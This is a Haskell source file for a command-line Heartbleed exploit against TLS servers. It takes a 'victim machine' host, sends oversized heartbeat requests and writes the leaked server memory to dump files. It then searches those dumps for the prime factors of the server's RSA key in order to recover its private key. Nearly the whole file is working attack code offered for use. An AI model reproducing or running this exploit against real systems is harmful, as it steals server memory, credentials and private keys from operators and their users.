import Options
import Control.Applicative (pure, (<*>), (<$>))
import Control.Exception
import Crypto.Random
import Crypto.Types.PubKey.RSA 
import Data.Bits (shiftR, shiftL, Bits)
import Data.Default.Class (def)
import Data.Maybe (isJust, fromJust)
import Network.Socket
import Network.BSD
import Network.TLS
import Network.TLS.Extra.Cipher (ciphersuite_all)
import Data.Word
import Data.Time.Clock.POSIX (getPOSIXTime)
import Data.ByteString.Lazy.Builder
import Data.Array.Repa hiding (map, (++))
import qualified Data.ByteString as B
import qualified Data.ByteString.Lazy as LB
import qualified Data.ByteString.Char8 as C8
import qualified Data.Array.Repa.Repr.ByteString as RB
import qualified Data.Array.Repa.Repr.Vector as RV
import Data.X509 (CertificateChain(..), DnElement(..),
                  getCertificate, certSubjectDN, getDnElement, certPubKey,
                  getCharacterStringRawData)
import System.Directory (createDirectoryIfMissing)
import Text.Printf (printf)
import Data.IORef
import System.IO.Unsafe (unsafePerformIO)


data Config = Config { cHost :: HostName
                     , cPort :: Word16
                     , cTimes :: Int
                     , cSize :: Word16
                     -- , cTimeout :: Int
                     , cTLSVersion :: Version
                     , cOutputDumps :: FilePath
                     , cOutputKeys :: FilePath }


instance SimpleOptionType Version where
  simpleOptionType = optionType "TLS Version" TLS12 parseTLS showTLS where
    parseTLS tls 
      | tls == "SSLv3"   = Right SSL3
      | tls == "TLSv1"   = Right TLS10
      | tls == "TLSv1.1" = Right TLS11
      | tls == "TLSv1.2" = Right TLS12
      | otherwise = Left ("Unsupported TLS Version: "++show tls)


instance Options Config where
  defineOptions = pure Config
    <*> simpleOption "host" "" "Host name or an IP address of the victim machine (required)"
    <*> simpleOption "port" 443 "Port number"
    <*> simpleOption "times" 1 "Number of iterations."
    <*> simpleOption "size" 0xFFFF "Number fo bytes to retrieve from the server (0, 65535]"
    -- <*> simpleOption "timeout" 10 "Connection timeout"
    <*> simpleOption "tls" TLS12 ("Highest version of TLS to use. Available options are: "++
                                   "SSLv3, TLSv1, TLSv1.1 and TLSv1.2")
    <*> simpleOption "output-dumps" "dumps" "Folder where memory dumps should be stored"
    <*> simpleOption "output-keys" "" ("Folder where keys should be stored in case any "++
                                       "should be retrieved")

    
showTLS :: Version -> String    
showTLS (SSL2)  = "SSLv2"
showTLS (SSL3)  = "SSLv3"
showTLS (TLS10) = "TLSv1"
showTLS (TLS11) = "TLSv1.1"
showTLS (TLS12) = "TLSv1.2"


hashSignatures :: [(HashAlgorithm, SignatureAlgorithm)]
hashSignatures = concat [[(hash, sig) | hash <- hashes] |
                         (sig, hashes) <- [
                           (SignatureAnonymous, [HashNone]),
                           (SignatureRSA, [HashSHA512, HashSHA256, HashSHA1]),
                           (SignatureDSS, [HashSHA1])]]

publicKeyIORef :: (IORef Int, IORef Integer, IORef Integer)
publicKeyIORef = unsafePerformIO $ do
  size' <- newIORef 0
  n <- newIORef 0
  e <- newIORef 0
  return (size', n, e)


storePublicKey :: Maybe PublicKey -> IO ()
storePublicKey Nothing = return ()
storePublicKey (Just (PublicKey { public_size = size'
                                , public_n = n
                                , public_e = e })) = writePublicKeyIORef publicKeyIORef
  where writePublicKeyIORef (ref_size, ref_n, ref_e) =
          writeIORef ref_size size' >> writeIORef ref_n n >> writeIORef ref_e e


readPublicKey :: IO (Maybe PublicKey)
readPublicKey = do
  let (ref_size, ref_n, ref_e) = publicKeyIORef
  size' <- readIORef ref_size
  n <- readIORef ref_n
  e <- readIORef ref_e
  return $ if size' == 0 || n == 0 || e == 0 then Nothing
           else Just $ PublicKey { public_size = size'
                                 , public_n = n
                                 , public_e = e }


storePubKey :: CertificateChain -> IO ()
storePubKey (CertificateChain chain) = do
  let certs = map getCertificate chain
      cert = head certs
      dn = getDnElement DnCommonName $ certSubjectDN cert
      pubKey = certPubKey cert
      getPublicKey (PubKeyRSA pk) = return $ Just pk
      getPublicKey _ = do
                       putStrLn "Only RSA Private Key Retrieval is supported."
                       return Nothing
  if null certs then putStrLn "WARNING: Certificate Chain is empty"
    else do
    if isJust dn then 
      putStrLn ("Received Public Key for CN: " ++
                (C8.unpack $ getCharacterStringRawData $ fromJust dn))
      else
      putStrLn "Received a PublicKey"
    pk <- getPublicKey pubKey
    storePublicKey pk
    return ()
  

initConnection :: Config -> IO Context
initConnection conf = do
  addrInfo <- head <$> getAddrInfo Nothing (Just $ cHost conf) (Just $ show $ cPort conf)
  protocol <- protoNumber <$> getProtocolByName "TCP"
  sock <- socket AF_INET Stream protocol
  --setSocketOption sock RecvTimeOut $ cTimeout conf
  --setSocketOption sock SendTimeOut $ cTimeout conf
  connect sock $ addrAddress addrInfo
  entropyPool <- createEntropyPool
  let (vsLess, vsMore) = break (==(cTLSVersion conf)) [SSL3, TLS10, TLS11, TLS12]
      versions = vsLess++[head vsMore]
      params = (defaultParamsClient (cHost conf) B.empty) {
        clientSupported = Supported {
           supportedVersions = versions 
           , supportedCiphers = ciphersuite_all
           , supportedCompressions = [nullCompression]
           , supportedHashSignatures = hashSignatures
           , supportedSecureRenegotiation = True
           , supportedSession = False}
        , clientHooks = def {
           onServerCertificate = (\_ _ _ chain -> storePubKey chain >> return [])
           , onSuggestALPN = return Nothing
           }}
      rng = cprgCreate entropyPool :: SystemRNG
  context <- contextNew sock params $ rng
  handshake context
  contextInfo <- contextGetInformation context
  let versionTLS = if isJust contextInfo
                   then showTLS $ infoVersion $ fromJust contextInfo
                   else "a"
  putStrLn ("Established "++versionTLS++" connection with: "
            ++(cHost conf)++":"++(show $ cPort conf))
  return context  

getHeartbeatRequest :: Word16 -> B.ByteString
getHeartbeatRequest payload_length =
  B.pack [0x01] `B.append` (LB.toStrict $ toLazyByteString $ word16BE payload_length)


getIntegerSize :: (Num a, Num a1, Bits a) => a -> a1
getIntegerSize i = getSize 0 i where
  getSize b n = if n == 0 then b else getSize (b+1) (shiftR n 1)


searchForPrivateKeys :: PublicKey -> C8.ByteString -> [(Integer, Integer)]
searchForPrivateKeys pubKey data' =
  filter ((0,0)/=) (toList arr')
  where n = public_n pubKey
        arr' :: Array RV.V DIM1 (Integer, Integer)
        arr' = head $ computeP $ traverse data''
               (const (Z :. ((B.length data') - p_size - 1))) getFactors
        data'' = RB.fromByteString (Z :. B.length data') data'
        n_bits = getIntegerSize n
        p_size = (n_bits `div` 8) `div` 2
        getP str = B.foldr' (\i p' -> (toInteger i) + (shiftL p' 8)) 0 str
        getFactors _ (Z :. x) =
          if p' > 1 && (p' `mod` 2) /= 0 && -- (getIntegerSize p' == p_size) &&
             n `rem` p' == 0 && n /= p'
          then (p', n `quot` p') else (0, 0)
          where p' = getP $ B.take p_size $ B.drop (x-1) data'
                

bleed :: FilePath -> FilePath -> Context -> Config -> Maybe PublicKey -> Int -> IO ()
bleed folder keysFolder context conf pubKey n = do
  let filename = folder++(printf "%05d" n)++".bin"
      size' = fromInteger $ toInteger $ cSize conf
      getData c s = if s <= 0 then return B.empty else
                      do { d <- recvData c
                         ; (d `B.append`) <$> (getData c (s - (B.length d))) }
  sendPacket context (Heartbeat $ getHeartbeatRequest $ cSize conf)
  -- 1   byte:  Heartbeat Message Type (0x02 - Response)
  -- 2   bytes: payload length
  -- n   bytes: payload
  -- 16+ bytes: required random padding
  result <- try (getData context (3 + size' + 16)) :: IO (Either SomeException B.ByteString)
  (data', context') <- case result of
      Left _ -> do
        -- reconnect in case previous connection was closed by the server.
        contextFlush context >> contextClose context
        putStrLn "Connection lost, reconnecting to server..."
        context' <- initConnection conf
        sendPacket context' (Heartbeat $ getHeartbeatRequest $ cSize conf)
        data' <- getData context' (3 + size' + 16)
        return (data', context')
      Right data' -> return (data', context)
  let privKeys = if isJust pubKey && (not $ null keysFolder)
                 then searchForPrivateKeys (fromJust pubKey) data' 
                 else []
  B.writeFile filename (B.take size' $ B.drop 3 data')
  putStrLn (show n++". Saved "++show size'++" bytes of memory dump to: "++filename)
  n' <- if null privKeys then return n 
           else print privKeys >> return (cTimes conf)
  if n' == (cTimes conf) then bye context' >> contextClose context' 
    else bleed folder keysFolder context' conf pubKey (n+1)


runMain :: Config -> [String] -> IO ()
runMain conf _ = do
  let host = cHost conf
      port = cPort conf
  if null host then putStrLn "Host is a required argument." else return ()
  context <- initConnection conf
  timestamp <- round <$> getPOSIXTime :: IO Int
  let dumpsFolder = (cOutputDumps conf)++"/"++host++":"++(show port)++"/"++(show timestamp)++"/"
  createDirectoryIfMissing True dumpsFolder
  keysFolder <- if null (cOutputKeys conf) then return "" else do
                  let f = (cOutputKeys conf)++"/"++host++":"++(show port)++"/"++(show timestamp)++"/"
                  createDirectoryIfMissing True f
                  return f
  pubKey <- readPublicKey
  bleed dumpsFolder keysFolder context conf pubKey 1
  

main :: IO ()
main = runCommand runMain
